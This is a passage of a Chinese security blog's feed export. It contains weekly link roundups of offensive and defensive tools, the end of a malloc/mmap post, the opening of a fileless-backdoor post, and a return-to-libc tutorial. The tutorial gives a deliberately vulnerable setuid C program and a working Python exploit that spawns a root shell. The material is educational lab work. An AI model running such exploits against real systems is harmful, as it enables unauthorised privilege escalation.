mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</div><div class="line">        if (addr == MAP_FAILED)</div><div class="line">                errExit(&quot;mmap&quot;);</div><div class="line">        printf(&quot;After mmap\n&quot;);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        /* Unmap mapped region. */</div><div class="line">        ret = munmap(addr, (size_t)132*1024);</div><div class="line">        if(ret == -1)</div><div class="line">                errExit(&quot;munmap&quot;);</div><div class="line">        printf(&quot;After munmap\n&quot;);</div><div class="line">        getchar();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>输出分析：</p>
</li>
<li>在使用mmap之前：我们注意下面的一个内存地址段<br><img src="/2018/03/18/malloc的系统调用/mmapbefore.png" alt=""></li>
<li>当我们通过mmap申请了132KB的空间的时候，看到如下图<br><img src="/2018/03/18/malloc的系统调用/mmapafter.png" alt=""><br>b7df0000-b7e12000 其中这段虚拟内存地址就包含了我们刚刚申请到132KB大小的地址空间</li>
<li>其中b7df0000-b7e12000 是这个块的地址范围，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li>
<li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.</li>
<li>当munmap之后，下面的输出我们可以看的到申请的内存被释放（变成原来的b7e11000-b7e12000），又交还给了操作系统。<br><img src="/2018/03/18/malloc的系统调用/aftermunmap.png" alt=""><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>在64位上brk和32的结果是相同的，但是mmap的会有不同，原因暂时不明。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">Syscalls used by malloc.</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180312安全动态</title>
    <link href="http://kevien.github.io/2018/03/12/20180312%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/03/12/20180312安全动态/</id>
    <published>2018-03-12T04:55:39.000Z</published>
    <updated>2018-03-17T15:26:04.270Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Log every executed command to syslog (a.k.a. Snoopy Logger).<br><a href="https://github.com/a2o/snoopy" target="_blank" rel="external">https://github.com/a2o/snoopy</a></li>
<li>An information security preparedness tool to do adversarial simulation.<br><a href="https://github.com/uber-common/metta" target="_blank" rel="external">https://github.com/uber-common/metta</a></li>
<li>固件逆向介绍（Video）<br><a href="https://www.youtube.com/watch?v=GIU4yJn2-2A" target="_blank" rel="external">https://www.youtube.com/watch?v=GIU4yJn2-2A</a></li>
<li>ELF 二进制中的定向函数 Fuzzing<br><a href="https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/" target="_blank" rel="external">https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/</a></li>
<li>Unix system calls<br><a href="http://t.cn/REkcu67" target="_blank" rel="external">http://t.cn/REkcu67</a><br><a href="http://t.cn/REkcu6g" target="_blank" rel="external">http://t.cn/REkcu6g</a></li>
<li>Sudohulk - 替换 sudo，利用 ptrace Hook execve 系统调用实现劫持<br><a href="https://github.com/hc0d3r/sudohulk" target="_blank" rel="external">https://github.com/hc0d3r/sudohulk</a></li>
<li>rootstealer - 检测 Linux 中的 root 用户终端并注入自定义命令<br><a href="https://github.com/CoolerVoid/rootstealer" target="_blank" rel="external">https://github.com/CoolerVoid/rootstealer</a></li>
<li><p>0d1n - 自动化 Web 安全扫描器<br><a href="https://github.com/CoolerVoid/0d1n" target="_blank" rel="external">https://github.com/CoolerVoid/0d1n</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c语言写的</div></pre></td></tr></table></figure>
</li>
<li><p>通过实践学习 Radare<br><a href="http://www.radare.org/get/THC2018.pdf" target="_blank" rel="external">http://www.radare.org/get/THC2018.pdf</a></p>
</li>
<li>Let’s Encrypt 宣布 ACME v2 和通配证书（wildcard）支持现已上线<br><a href="https://community.letsencrypt.org/t/acme-v2-and-wildcard-certificate-support-is-live/55579" target="_blank" rel="external">https://community.letsencrypt.org/t/acme-v2-and-wildcard-certificate-support-is-live/55579</a></li>
<li>vbg - 通过 X11 转发会话在 SSH 客户端上注入 Keystrokes 的工具<br><a href="https://github.com/xfee/vbg" target="_blank" rel="external">https://github.com/xfee/vbg</a></li>
<li>从 4.0.0 开始的所有版本的 Samba 存在认证用户修改任意用户密码的漏洞（CVE-2018-1050）<br><https: wiki.samba.org="" index.php="" cve-2018-1057=""></https:></li>
<li>CredSSP 存在严重漏洞(CVE-2018-0886)允许攻击者通过 MS-RDP 服务在服务器上远程执行代码（Video）<br><a href="https://blog.preempt.com/security-advisory-credssp" target="_blank" rel="external">https://blog.preempt.com/security-advisory-credssp</a></li>
<li>以 Firefox 做通信通道来绕过防火墙限制的探索<br><a href="https://medium.com/code-fighters/firefox-tunnel-to-bypass-any-firewall-bc6f8b432980" target="_blank" rel="external">https://medium.com/code-fighters/firefox-tunnel-to-bypass-any-firewall-bc6f8b432980</a></li>
<li>C 编译器生成只包含可打印字符的可执行文件(Paper)<br><a href="http://www.cs.cmu.edu/~tom7/abc/paper.pdf" target="_blank" rel="external">http://www.cs.cmu.edu/~tom7/abc/paper.pdf</a></li>
<li>打造 GSM 基站<br><a href="https://n0where.net/build-gsm-base-station" target="_blank" rel="external">https://n0where.net/build-gsm-base-station</a></li>
<li>使用 GDB 进行进程注入<br><a href="https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html" target="_blank" rel="external">https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html</a></li>
<li>通过伪装图标的 JS 快捷方式调用 UNC 路径窃取用户 NetNTLM Hash<br><a href="https://isc.sans.edu/forums/diary/Payload+delivery+via+SMB/23433/" target="_blank" rel="external">https://isc.sans.edu/forums/diary/Payload+delivery+via+SMB/23433/</a></li>
<li>uxss-db - UXSS 漏洞搜集仓库<br><a href="https://github.com/Metnew/uxss-db" target="_blank" rel="external">https://github.com/Metnew/uxss-db</a></li>
<li>DockerAttack - 渗透测试用的 Docker 镜像<br><a href="https://github.com/ZephrFish/DockerAttack" target="_blank" rel="external">https://github.com/ZephrFish/DockerAttack</a></li>
<li>getaltname - 从 SSL 证书中提取域名的工具<br><a href="https://github.com/franccesco/getaltname" target="_blank" rel="external">https://github.com/franccesco/getaltname</a></li>
<li>RAT-via-Telegram - 利用 Telegram 进行 C&amp;C 通信的 Windows 远程控制工具<br><a href="https://github.com/Dviros/RAT-via-Telegram" target="_blank" rel="external">https://github.com/Dviros/RAT-via-Telegram</a></li>
<li>Diamorphine - 适用于 Linux Kernels 2.6.x/3.x/4.x 内核的 LKM rootkit<br><a href="https://github.com/alex91ar/Diamorphine" target="_blank" rel="external">https://github.com/alex91ar/Diamorphine</a></li>
<li>Regaxor 正则表达式模糊测试工具介绍<br><a href="https://github.com/0xSobky/HackVault/wiki/Regaxor:-Fuzzing-Regexes-for-Fun-and-Not%E2%80%90So%E2%80%90Much-Profit" target="_blank" rel="external">https://github.com/0xSobky/HackVault/wiki/Regaxor:-Fuzzing-Regexes-for-Fun-and-Not%E2%80%90So%E2%80%90Much-Profit</a></li>
<li>arm_now - 帮助研究人员快速配置测试虚拟机的工具，支持多种 CPU 架构<br><a href="https://github.com/nongiach/arm_now" target="_blank" rel="external">https://github.com/nongiach/arm_now</a></li>
<li>lazyrecon - 渗透测试前期情报自动化收集工具<br><a href="https://github.com/nahamsec/lazyrecon" target="_blank" rel="external">https://github.com/nahamsec/lazyrecon</a></li>
<li>Linux Heap Exploitation Intro Series: Set you free()<br><a href="https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/" target="_blank" rel="external">https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/</a></li>
<li>使用 Webhooks 绕过支付<br><a href="http://lightningsecurity.io/blog/bypassing-payments-using-webhooks/" target="_blank" rel="external">http://lightningsecurity.io/blog/bypassing-payments-using-webhooks/</a></li>
<li>Microsoft checkedc: C 的扩展，向 C 中加入了边界检查<br><a href="https://github.com/Microsoft/checkedc" target="_blank" rel="external">https://github.com/Microsoft/checkedc</a></li>
<li>Cobalt Strike PowerShell Payload 混淆以绕过 Windows Defender 防御<br><a href="http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/" target="_blank" rel="external">http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/</a></li>
<li>利用已签名程序 dvdplay.exe 做启动项的技巧<br><a href="http://www.hexacorn.com/blog/2018/03/15/beyond-good-ol-run-key-part-73/" target="_blank" rel="external">http://www.hexacorn.com/blog/2018/03/15/beyond-good-ol-run-key-part-73/</a></li>
<li>Powershell-RAT - 基于 Python 的后门程序，使用 Gmail 通过附件将数据泄露出去<br><a href="https://github.com/Viralmaniar/Powershell-RAT" target="_blank" rel="external">https://github.com/Viralmaniar/Powershell-RAT</a></li>
<li>区块链安全 - DAO攻击事件解析<br><a href="https://paper.seebug.org/544/" target="_blank" rel="external">https://paper.seebug.org/544/</a></li>
<li>区块链安全 - 以太坊短地址攻击<br><a href="https://paper.seebug.org/545/" target="_blank" rel="external">https://paper.seebug.org/545/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Log every executed command to syslog (a.k.a. Sno
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180305安全动态</title>
    <link href="http://kevien.github.io/2018/03/05/20180305%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/03/05/20180305安全动态/</id>
    <published>2018-03-05T05:27:54.000Z</published>
    <updated>2018-03-09T05:48:54.896Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>编写 Bash 自动补全脚本<br><a href="https://iridakos.com/tutorials/2018/03/01/bash-programmable-completion-tutorial.html" target="_blank" rel="external">https://iridakos.com/tutorials/2018/03/01/bash-programmable-completion-tutorial.html</a></li>
<li>使用 IDA Pro 和 X64dbg 逆向分析 Gootkit 恶意软件<br><a href="https://www.youtube.com/watch?v=242Tn0IL2jE&amp;;feature=youtu.be" target="_blank" rel="external">https://www.youtube.com/watch?v=242Tn0IL2jE&amp;;feature=youtu.be</a></li>
<li>C++ STL 库错误用法的检测<br><a href="https://kristerw.blogspot.se/2018/03/detecting-incorrect-c-stl-usage.html" target="_blank" rel="external">https://kristerw.blogspot.se/2018/03/detecting-incorrect-c-stl-usage.html</a></li>
<li>Seth - 对 RDP 服务实施中间人攻击的工具，可从 RDP 连接中提取明文密码<br><a href="https://github.com/SySS-Research/Seth" target="_blank" rel="external">https://github.com/SySS-Research/Seth</a></li>
<li>路由器 XSS 漏洞挖掘实例<br><a href="https://mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html" target="_blank" rel="external">https://mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html</a></li>
<li>爬虫基础篇[Web 漏洞扫描器]<br><a href="https://paper.seebug.org/537/" target="_blank" rel="external">https://paper.seebug.org/537/</a></li>
<li>Gaining Domain Admin from Outside Active Directory，从域外获取域管权限<br><a href="https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html" target="_blank" rel="external">https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html</a></li>
<li>IDA操作知识记录<br><a href="https://juejin.im/entry/5a37674d6fb9a04514642358" target="_blank" rel="external">https://juejin.im/entry/5a37674d6fb9a04514642358</a></li>
<li>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing<br><a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/" target="_blank" rel="external">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a></li>
<li>Password Filter DLL在渗透测试中的应用<br><a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</a></li>
<li>SharpShooter - Payload 生成器，可以生成能逃逸杀软、沙盒、EDR 检测的样本，支持多种格式（HTA/JS/JSE/VBA/VBE/VBS/WSF）<br><a href="https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/" target="_blank" rel="external">https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/</a></li>
<li>Stored XSS, and SSRF in Google using the Dataset Publishing Language<br><a href="https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html" target="_blank" rel="external">https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html</a></li>
<li>PKI基础知识：如何管理证书存储<br><a href="https://blogs.technet.microsoft.com/askpfeplat/2018/03/05/pki-basics-how-to-manage-the-certificate-store/" target="_blank" rel="external">https://blogs.technet.microsoft.com/askpfeplat/2018/03/05/pki-basics-how-to-manage-the-certificate-store/</a></li>
<li>Python-Rootkit - Python 远控，用于和 Meterpreter 建立会话<br><a href="https://github.com/islamTaha12/Python-Rootkit" target="_blank" rel="external">https://github.com/islamTaha12/Python-Rootkit</a></li>
<li>Fastly 公司构建其 WAF 产品测试套件的方法<br><a href="https://www.fastly.com/blog/building-waf-test-harness" target="_blank" rel="external">https://www.fastly.com/blog/building-waf-test-harness</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;编写 Bash 自动补全脚本&lt;br&gt;&lt;a href=&quot;https://iridakos.com/
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>通过return-to-libc绕过NX-bit</title>
    <link href="http://kevien.github.io/2018/02/26/%E9%80%9A%E8%BF%87return-to-libc%E7%BB%95%E8%BF%87NX-bit/"/>
    <id>http://kevien.github.io/2018/02/26/通过return-to-libc绕过NX-bit/</id>
    <published>2018-02-26T15:13:31.000Z</published>
    <updated>2018-02-26T15:39:45.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li>读此文章之前建议先读一下这篇文章<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">linux栈溢出学习笔记</a></li>
<li>本次的测试环境是ubuntu14.04（X86).</li>
<li>为了缓解攻击者的行为，专家们想出了一项缓解缓冲区溢出漏洞利用的措施叫做“NX Bit”.</li>
<li>什么是NX(No-eXecute) Bit，<a href="https://www.wikiwand.com/en/NX_bit" target="_blank" rel="external">wiki</a>,它是一项让某个特定区域的内存代码变得不可执行不可修改的技术，例如，数据区域、栈空间和堆空间是不可执行的，代码区是不可写入的。当NX bit开启的时候，我们之前的缓冲区溢出利用将会失败，因为我们之前的shellcode会被复制到栈中然后我们的返回地址会被指向我们的shellcode从而执行我们的shellcode，但是自从栈中的代码不可以执行之后，我们的exploit会失败，但是这种缓解措施并不是一劳永逸的，因此这篇文章将介绍如何绕过NX Bit！<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> //vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line"> char buf[256]; /* [1] */ </div><div class="line"> strcpy(buf,argv[1]); /* [2] */</div><div class="line"> printf(&quot;%s\n&quot;,buf); /* [3] */</div><div class="line"> fflush(stdout);  /* [4] */</div><div class="line"> return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</div><div class="line">$gcc -g -fno-stack-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<ul>
<li>需要注意的是 当参数-z execstack 没有传入（默认没有）的时候，我们的NX bit是没有开起来的<br>我们可以通过readelf -l 命令来查看一下<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/readelf.png" alt=""></li>
<li>可以看到栈空间只有RW的标志而没有E的标志。<h4 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h4></li>
<li>攻击者可以使用“return-to-libc”的技巧来绕过NX bit，这里返回地址被一个特定的libc的函数地址所覆盖（而不是包含shellcode的栈空间地址），例如如果攻击者想要去得到一个shell，他可以使用system（）函数的地址去覆盖返回函数的地址，同时在栈中设置system需要的合适参数来供其成功的调用。</li>
<li><p>漏洞利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </div><div class="line">#For example system address = libc base address + system offset</div><div class="line">#where </div><div class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</div><div class="line">       #system offset     = 0x0003f060 (obtained from &quot;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system&quot;)</div><div class="line"></div><div class="line">system = 0xb7e52310       #0xb7e2000+0x0003f060</div><div class="line">exit = 0xb7e45260          #0xb7e2000+0x00032be0</div><div class="line"></div><div class="line">#system_arg points to &apos;sh&apos; substring of &apos;fflush&apos; string. </div><div class="line">#To spawn a shell, system argument should be &apos;sh&apos; and hence this is the reason for adding line [4] in vuln.c. </div><div class="line">#But incase there is0xb754b260 no &apos;sh&apos; in vulnerable binary, we can take the other approach of pushing &apos;sh&apos; string at the end of user input!!</div><div class="line">system_arg = 0xb7ffee11     #(obtained from hexdump output of the binary)</div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack(&quot;&lt;I&quot;,num)</div><div class="line">buf = &quot;A&quot; * 268</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print &quot;Calling vulnerable program&quot;</div><div class="line">call([&quot;./vuln&quot;, buf])</div></pre></td></tr></table></figure>
</li>
<li><p>关于system和exit以及sh的查找可以使用如下的方法<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/findaddr.png" alt=""></p>
</li>
<li>最后执行上面的利用代码可以得到我们想要的shell，如下图<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/exp.png" alt=""><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" target="_blank" rel="external">Bypassing NX bit using return-to-libc</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;读此文章之前建议先读一下这篇文章&lt;a href=&quot;https://kevien.github.io/2017/08/16/lin
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180223安全动态</title>
    <link href="http://kevien.github.io/2018/02/23/20180223%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/02/23/20180223安全动态/</id>
    <published>2018-02-23T05:54:25.000Z</published>
    <updated>2018-03-02T06:37:05.842Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Bug Bounty Web 漏洞挖掘的几个小 Tips<br><a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#104;&#116;&#116;&#112;&#x73;&#x3a;&#x2f;&#x2f;&#109;&#101;&#100;&#105;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#47;&#64;&#x70;&#114;&#97;&#x74;&#x65;&#x65;&#107;&#95;&#x30;&#52;&#57;&#x30;&#47;&#98;&#117;&#103;&#45;&#x62;&#111;&#x75;&#x6e;&#x74;&#x79;&#45;&#x74;&#105;&#112;&#115;&#x2d;&#116;&#x72;&#105;&#99;&#x6b;&#x73;&#x2d;&#x6a;&#x73;&#x2d;&#106;&#97;&#118;&#97;&#115;&#99;&#x72;&#x69;&#x70;&#116;&#x2d;&#102;&#105;&#x6c;&#101;&#x73;&#x2d;&#98;&#x64;&#100;&#x65;&#52;&#x31;&#50;&#101;&#97;&#x34;&#x39;&#x64;">&#104;&#116;&#116;&#112;&#x73;&#x3a;&#x2f;&#x2f;&#109;&#101;&#100;&#105;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#47;&#64;&#x70;&#114;&#97;&#x74;&#x65;&#x65;&#107;&#95;&#x30;&#52;&#57;&#x30;&#47;&#98;&#117;&#103;&#45;&#x62;&#111;&#x75;&#x6e;&#x74;&#x79;&#45;&#x74;&#105;&#112;&#115;&#x2d;&#116;&#x72;&#105;&#99;&#x6b;&#x73;&#x2d;&#x6a;&#x73;&#x2d;&#106;&#97;&#118;&#97;&#115;&#99;&#x72;&#x69;&#x70;&#116;&#x2d;&#102;&#105;&#x6c;&#101;&#x73;&#x2d;&#98;&#x64;&#100;&#x65;&#52;&#x31;&#50;&#101;&#97;&#x34;&#x39;&#x64;</a></li>
<li>Linux ASLR 缓解措施的新绕过方法<br><a href="http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html" target="_blank" rel="external">http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html</a></li>
<li>Linux 系统调用的过程剖析<br><a href="https://lwn.net/Articles/604287/" target="_blank" rel="external">https://lwn.net/Articles/604287/</a></li>
<li>Windows 平台用户态 API 监控与代码注入的检测<br><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565" target="_blank" rel="external">https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565</a></li>
<li>Google Service Management 服务 7.5K Bounty 奖金漏洞的分析<br><a href="https://sites.google.com/site/testsitehacking/-7-5k-Google-services-mix-up" target="_blank" rel="external">https://sites.google.com/site/testsitehacking/-7-5k-Google-services-mix-up</a></li>
<li>挖洞经验 | 看我如何参加众测项目发现美国国防部网站的各类高危漏洞<br><a href="http://www.freebuf.com/articles/others-articles/162579.html" target="_blank" rel="external">http://www.freebuf.com/articles/others-articles/162579.html</a></li>
<li>Docker 环境中的事件分析与取证<br><a href="https://static.ernw.de/whitepaper/ERNW_Whitepaper64_IncidentForensicDocker_signed.pdf" target="_blank" rel="external">https://static.ernw.de/whitepaper/ERNW_Whitepaper64_IncidentForensicDocker_signed.pdf</a></li>
<li>Gaining root via UART<br><a href="http://konukoii.com/blog/2018/02/16/5-min-tutorial-root-via-uart/" target="_blank" rel="external">http://konukoii.com/blog/2018/02/16/5-min-tutorial-root-via-uart/</a></li>
<li>Digging passwords in Linux swap<br><a href="http://blog.sevagas.com/?Digging-passwords-in-Linux-swap" target="_blank" rel="external">http://blog.sevagas.com/?Digging-passwords-in-Linux-swap</a></li>
<li>我是如何在 bug bounty 项目中绕过双因素认证的<br><a href="http://c0d3g33k.blogspot.it/2018/02/how-i-bypassed-2-factor-authentication.html" target="_blank" rel="external">http://c0d3g33k.blogspot.it/2018/02/how-i-bypassed-2-factor-authentication.html</a></li>
<li>Windows 主机中使用自带工具 Netsh 实现端口转发<br><a href="http://woshub.com/port-forwarding-in-windows/" target="_blank" rel="external">http://woshub.com/port-forwarding-in-windows/</a></li>
<li>从 IoT 设备逆向的角度看小米 IoT 生态系统<br><a href="https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Reversing-IoT-Xiaomi-ecosystem.pdf" target="_blank" rel="external">https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Reversing-IoT-Xiaomi-ecosystem.pdf</a></li>
<li>窃取 SSH credentials 的另一种方式<br><a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank" rel="external">https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html</a></li>
<li>Puszek - Linux kernel module rootkit<br><a href="https://github.com/Eterna1/puszek-rootkit" target="_blank" rel="external">https://github.com/Eterna1/puszek-rootkit</a></li>
<li>JShell - Get a JavaScript shell with XSS<br><a href="https://github.com/UltimateHackers/JShell" target="_blank" rel="external">https://github.com/UltimateHackers/JShell</a></li>
<li>ctf-pwn-tips<br><a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="external">https://github.com/Naetw/CTF-pwn-tips</a></li>
<li>honeytrap - 一款蜜罐框架<br><a href="https://github.com/honeytrap/honeytrap" target="_blank" rel="external">https://github.com/honeytrap/honeytrap</a></li>
<li>Researcher Resources - How to become a Bug Bounty Hunter<br><a href="https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102" target="_blank" rel="external">https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Bug Bounty Web 漏洞挖掘的几个小 Tips&lt;br&gt;&lt;a href=&quot;&amp;#109;&amp;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux一种无文件后门技巧</title>
    <link href="http://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://kevien.github.io/2018/02/20/linux一种无文件后门技巧/</id>
    <published>2018-02-20T03:51:50.000Z</published>
    <updated>2018-03-09T10:16:52.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="external">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</div></pre></td></tr></table></figure>
</li>
<li><p>我之前没有听过memfd_create和fexecve…就是这里引发了我的好奇，我决定学习和研究一下。</p>
</li>
